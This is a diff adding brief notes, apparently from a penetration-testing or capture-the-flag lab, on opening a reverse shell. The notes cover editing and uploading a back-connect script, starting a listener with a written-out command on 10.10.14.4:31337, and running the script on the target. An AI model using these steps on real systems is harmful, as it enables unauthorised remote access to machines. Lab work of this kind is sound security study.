@@ -1,0 +1,9 @@
+1. Select type of reverse shell, edit the file to change IP:PORT and upload to server - likely tcp_pty_backconnect.py
+
+2. Bind the shell handler(listener):
+
+python tcp_pty_shell_handler.py -b 10.10.14.4:31337 
+
+^ yes, you have to use your local ip
+
+3. Execute the python script on target
